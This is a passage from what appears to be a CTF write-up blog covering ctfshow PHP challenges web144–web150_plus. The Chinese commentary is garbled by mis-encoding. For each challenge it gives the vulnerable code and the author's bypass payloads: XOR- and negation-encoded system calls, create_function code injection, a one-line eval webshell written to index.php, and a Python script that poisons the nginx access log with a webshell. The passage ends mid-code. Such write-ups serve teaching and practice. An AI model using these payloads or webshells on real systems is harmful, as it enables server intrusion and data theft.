class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> strlen($str)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>å’Œweb141ä¸€æ ·ï¼Œè¿™æ˜¯å‚æ•°éœ€è¦æ”¹ä¸€ä¸‹ï¼Œå› ä¸ºè¿™é‡Œæœ‰ä¸ªcheckå‡½æ•°å¯¹v3åšæ£€æµ‹ï¼Œæˆ‘ä»¬æŠŠpayloadæ”¹åˆ°v2å³å¯ï¼Œè¿è¡Œweb141çš„è„šæœ¬å°±è¡Œ<br>
payloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v3&#x3D;1&amp;v2&#x3D;*(&quot;%08%02%08%08%05%0d&quot;^&quot;%7b%7b%7b%7c%60%60&quot;)(&quot;%08%01%03%00%06%0c%01%07%00%0b%08%0b&quot;^&quot;%7c%60%60%20%60%60%60%60%2e%7b%60%7b&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web145"><a class="header-anchor" href="#web145">Â¶</a>web145</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>åœ¨å‰é¢åŸºç¡€ä¸Šbanäº†å¼‚æˆ–ï¼Œä½†æ”¾è¡Œäº†<code>~</code>å–åè¿ç®—ç¬¦ï¼Œä½†ä¹‹å‰v3éœ€è¦<code>* ; + - </code>ç­‰ç­‰ç¬¦å·æ¥æ‹œæ‰˜returnï¼Œä½†éƒ½è¢«banäº†ï¼Œæµ‹è¯•äº†ä¸€ä¸‹å‘ç°<code>|</code>å¯ä»¥ä½¿ç”¨<br>
å–åè„šæœ¬å¦‚ä¸‹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your function: &#x27;</span>);</span><br><span class="line">$system=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN));</span><br><span class="line">fwrite(STDOUT,<span class="string">&#x27;[+]your command: &#x27;</span>);</span><br><span class="line">$command=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="string">&quot;\r&quot;</span>, <span class="string">&quot;\n&quot;</span>), <span class="string">&quot;&quot;</span>, fgets(STDIN));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;[*] (~&#x27;</span>.urlencode(~$system).<span class="string">&#x27;)(~&#x27;</span>.urlencode(~$command).<span class="string">&#x27;);&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåæ„é€ payloadå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|</span><br></pre></td></tr></table></figure>
<h3 id="web146"><a class="header-anchor" href="#web146">Â¶</a>web146</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    $v1 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    $v2 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    $v3 = (<span class="keyword">String</span>)$_GET[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, $v3))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            $code =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.$code;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>æ²¡çœ‹å‡ºå’Œä¸Šä¸€é¢˜æœ‰ä»€ä¹ˆå·®åˆ«(å¯èƒ½å¤šbanäº†ä¸€äº›å­—ç¬¦)ï¼Œç›´æ¥ç”¨ä¸Šä¸€é¢˜payloadå³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?v1&#x3D;1&amp;v2&#x3D;1&amp;v3&#x3D;|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%93%9E%98%D1%8F%97%8F)|</span><br></pre></td></tr></table></figure>
<h3 id="web147"><a class="header-anchor" href="#web147">Â¶</a>web147</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    $ctfshow = $_POST[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,$ctfshow)) &#123;</span><br><span class="line">        $ctfshow(<span class="string">&#x27;&#x27;</span>,$_GET[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>æ¢äº†é¢˜å‹ï¼Œè¿™é‡Œå¯¹ctfè¿›è¡Œäº†ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ï¼Œpostä¼ å‚çš„<code>ctf</code>å’Œgetä¼ å‚çš„<code>show</code>è¿›è¡Œäº†ç»„åˆï¼Œè¿™é‡Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨<code>create_function()</code>ä»£ç æ³¨å…¥</p>
<blockquote>
<p>string create_function   ( string args  , string args , string code  )</p>
<p>string $args å˜é‡éƒ¨åˆ†<br>
string $code æ–¹æ³•ä»£ç éƒ¨åˆ†</p>
</blockquote>
<p>ä¾‹å¦‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">create_function(<span class="string">&#x27;$dotast&#x27;</span>,<span class="string">&#x27;echo $dotast.&quot;very cool&quot;&#x27;</span>)</span><br><span class="line"><span class="comment">//ç­‰äº</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">$dotast</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> $dotast.<span class="string">&quot;very cool&quot;</span>;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="comment">/*åˆ©ç”¨å¦‚ä¸‹</span></span><br><span class="line"><span class="comment">å¦‚æœæˆ‘ä»¬ç¬¬äºŒä¸ªå‚æ•°è¾“å…¥çš„æ˜¯&#x27;echo 111;&#125;phpinfo();//&#x27;</span></span><br><span class="line"><span class="comment">å³å¯æŠŠå‰é¢çš„æ–¹æ³•æ‹¬å·ç»™é—­åˆå¹¶ä¸”æˆåŠŸæ‰§è¡Œphpinfoå‘½ä»¤ï¼Œåé¢ç”¨//æ³¨é‡Šæ‰åè¾¹çš„è¯­å¥</span></span><br><span class="line"><span class="comment">ä¹Ÿå°±æ˜¯ä¸‹é¢è¿™ä¸ªç»“æ„</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">$dotast</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="number">111</span>;</span><br><span class="line">&#125;</span><br><span class="line">phpinfo();<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
<p>è€Œæ­£åˆ™è¡¨è¾¾å¼æˆ‘ä»¬å¯ä»¥ç”¨<code>\</code>è¿›è¡Œç»•è¿‡ï¼Œæ­£å¥½<code>\</code>åœ¨phpé‡Œä»£è¡¨é»˜è®¤å‘½åç©ºé—´</p>
<blockquote>
<p>phpé‡Œé»˜è®¤å‘½åç©ºé—´æ˜¯\ï¼Œæ‰€æœ‰åŸç”Ÿå‡½æ•°å’Œç±»éƒ½åœ¨è¿™ä¸ªå‘½åç©ºé—´ä¸­ã€‚ æ™®é€šè°ƒç”¨ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœç›´æ¥å†™å‡½æ•°åfunction_name()è°ƒç”¨ï¼Œè°ƒç”¨çš„æ—¶å€™å…¶å®ç›¸å½“äºå†™äº†ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼› è€Œå¦‚æœæ˜¯\function_name()è¿™æ ·çš„å½¢å¼å»è°ƒç”¨å‡½æ•°ï¼Œåˆ™æ˜¯è¡¨ç¤ºå†™äº†ä¸€ä¸ªç»å¯¹è·¯å¾„ã€‚ å¦‚æœä½ åœ¨å…¶ä»–namespaceé‡Œè°ƒç”¨ç³»ç»Ÿç±»ï¼Œå¿…é¡»ä½¿ç”¨ç»å¯¹è·¯å¾„çš„å†™æ³•</p>
</blockquote>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web147/E_13H4%40%7D%29_U8D%5D8BFQQ0%5B_S.png" alt=""><br>
æœ€ç»ˆpaylaodä¸º</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?show&#x3D;echo 123;&#125;system(&quot;tac flag.php&quot;);&#x2F;&#x2F;</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">ctf&#x3D;\create_function</span><br></pre></td></tr></table></figure>
<h3 id="web148"><a class="header-anchor" href="#web148">Â¶</a>web148</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    $code=$_GET[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,$code))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>æ²¡banæ‰å¼‚æˆ–å­—ç¬¦<code>^</code>ï¼Œä¹‹å‰ç”¨å‰é¢çš„è„šæœ¬è·‘å°±å¥½äº†</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/10 12:56</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># ç”Ÿæˆå¯ç”¨çš„å­—ç¬¦</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_rce</span>():</span></span><br><span class="line">    result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    preg = <span class="string">&#x27;[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> (re.match(preg, chr(i), re.I) <span class="keyword">or</span> re.match(preg, chr(j), re.I)):</span><br><span class="line">                k = i ^ j</span><br><span class="line">                <span class="keyword">if</span> k &gt;= <span class="number">32</span> <span class="keyword">and</span> k &lt;= <span class="number">126</span>:</span><br><span class="line">                    a = <span class="string">&#x27;%&#x27;</span> + hex(i)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    b = <span class="string">&#x27;%&#x27;</span> + hex(j)[<span class="number">2</span>:].zfill(<span class="number">2</span>)</span><br><span class="line">                    result += (chr(k) + <span class="string">&#x27; &#x27;</span> + a + <span class="string">&#x27; &#x27;</span> + b + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    f = open(<span class="string">&#x27;xor_rce.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    f.write(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ¹æ®è¾“å…¥çš„å‘½ä»¤åœ¨ç”Ÿæˆçš„txtä¸­è¿›è¡ŒåŒ¹é…</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">    s1 = <span class="string">&quot;&quot;</span></span><br><span class="line">    s2 = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">        f = open(<span class="string">&quot;xor_rce.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            t = f.readline()</span><br><span class="line">            <span class="keyword">if</span> t == <span class="string">&quot;&quot;</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> t[<span class="number">0</span>] == i:</span><br><span class="line">                s1 += t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">                s2 += t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        f.close()</span><br><span class="line">    output = <span class="string">&quot;(\&quot;&quot;</span> + s1 + <span class="string">&quot;\&quot;^\&quot;&quot;</span> + s2 + <span class="string">&quot;\&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> (output)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    write_rce()</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s1 = input(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s1 == <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s2 = input(<span class="string">&quot;[+] your commandï¼š&quot;</span>)</span><br><span class="line">        param = action(s1) + action(s2)</span><br><span class="line">        print(<span class="string">&quot;\n[*] result:\n&quot;</span> + param)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/Web1000%28%E4%B8%80%29/php%E7%89%B9%E6%80%A7/web148/2S12%252MNYT%241_OV9M%29%5DU_97.png" alt=""><br>
è¿è¡Œåå¾—åˆ°payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?code&#x3D;(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%0c%01%07%01%0b%08%0b&quot;^&quot;%7d%60%60%21%60%60%60%60%2f%7b%60%7b&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web149"><a class="header-anchor" href="#web149">Â¶</a>web149</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line">$files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">        <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">file_put_contents($_GET[<span class="string">&#x27;ctf&#x27;</span>], $_POST[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">$files = scandir(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>($files <span class="keyword">as</span> $file) &#123;</span><br><span class="line">    <span class="keyword">if</span>(is_file($file))&#123;</span><br><span class="line">        <span class="keyword">if</span> ($file !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            unlink($file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œç”¨file_put_contentså‡½æ•°å†™å…¥æ–‡ä»¶ï¼Œå¹¶ä¸”ä¼šæœ‰ä¸¤ä¸ªforå¾ªç¯åˆ¤æ–­ä¸æ˜¯index.phpçš„æ–‡ä»¶ä¼šè¢«åˆ é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥æŠŠä¸€å¥è¯æœ¨é©¬å†™è¿›index.phpå°±å¯ä»¥ï¼Œpaylaodå¦‚ä¸‹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?ctf&#x3D;index.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">show&#x3D;&lt;?php @eval($_POST[dotast]);?&gt;</span><br></pre></td></tr></table></figure>
<p>æ¥ç€å†index.phpé‡Œåˆ©ç”¨æˆ‘ä»¬çš„é©¬å³å¯</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url+index.php</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">dotast&#x3D;system(&quot;cat &#x2F;ctfshow_fl0g_here.txt&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="web150"><a class="header-anchor" href="#web150">Â¶</a>web150</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line">    <span class="keyword">private</span> $vip;</span><br><span class="line">    <span class="keyword">private</span> $secret;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params">$class</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿‡æ»¤å­—ç¬¦</span></span><br><span class="line">$key = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, $key))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($isVIP &amp;&amp; strrpos($ctf, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>($ctf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œæˆ‘ç”¨çš„æ—¥å¿—åŒ…å«ç»•è¿‡ï¼Œåº”è¯¥ä¹Ÿæ˜¯éé¢„æœŸè§£ï¼Œå’Œå‰é¢å†™è¿‡çš„æ—¥å¿—åŒ…å«å·®ä¸å¤šï¼Œè¿™é‡Œè¦æƒ³åŒ…å«éœ€è¦<code>$isvip</code>å˜é‡ä¸ºtrueæˆ–è€…1ï¼Œè¿™é‡Œæœ‰<code>QUERY_STRING</code>å’Œextractå‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç›´æ¥é€šè¿‡getä¼ å‚æ¥å®šä¹‰(å¿˜è®°è¿™ä¸ªçŸ¥è¯†ç‚¹çš„å¾€ä¸Šçœ‹web127)ï¼Œç„¶åå†<code>User-Agent</code>é‡Œå†™ä¸Šä¸€å¥è¯åˆ©ç”¨ï¼Œè¿™é‡Œå†™äº†è„šæœ¬è¿›è¡Œåˆ©ç”¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/3/7 11:50</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://5166dd5a-495e-4cd2-bad1-6a13b1cba45a.chall.ctf.show:8080/&quot;</span> + <span class="string">&quot;?isVIP=1&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0&lt;?php @eval($_POST[dotast]);?&gt;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;ctf&#x27;</span>: <span class="string">&#x27;/var/log/nginx/access.log&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dotast&#x27;</span>:<span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">result = requests.post(url=url, headers=headers, data=data)</span><br><span class="line">print(result.text)</span><br></pre></td></tr></table></figure>
<p>è¿è¡Œåå¾—åˆ°flag</p>
<h3 id="web150-plus"><a class="header-anchor" href="#web150-plus">Â¶</a>web150_plus</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $username;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line">    <span class="keyword">private</span> $vip;</span><br><span class="line">    <span class="keyword">private</span> $secret;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;secret = $flag;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params">$class</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($class))&#123;</span><br><span class="line">            $class();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿‡æ»¤å­—ç¬¦</span></span><br><span class="line">$key = $_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, $key))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">$ctf = $_POST[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span>(class_exists($__CTFSHOW__))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is 